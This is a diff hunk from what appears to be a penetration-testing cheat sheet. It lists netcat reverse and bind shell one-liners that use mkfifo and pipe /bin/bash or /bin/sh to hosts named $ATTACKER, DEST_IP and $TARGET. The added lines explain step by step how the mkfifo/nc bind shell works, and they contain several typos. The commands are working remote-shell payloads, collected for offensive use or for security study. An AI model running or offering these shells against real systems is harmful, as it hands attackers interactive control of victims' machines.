@@ -120,6 +120,14 @@ nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
 mkfifo /tmp/f; nc $ATTACKER 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TARGET 1234 >/tmp/f
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234 > /tmp/f
+
+1. rm -f /tmp/f = remove the file /tmp/f if exists (-f)
+2. ; = sequential execution
+3. mkfifo /tmp/f = create named pipe
+4. cat /tmp/f | = concatenates the FIFO named pipe file 
+5. | = connects stdout to stdin of the commands
+6. /bin/bash -i 2>&1 | = specifiy the bash interactive (-i) + standard error data stream (2) $ standar output data stream (1) redirected to the next command
+7. nc -l $TARGET 1234 > /tmp/f = send the result to nc, output sent to /tmp/f that uses bbash sehll waiting for the connection
 ```
 
   - **No NC**:
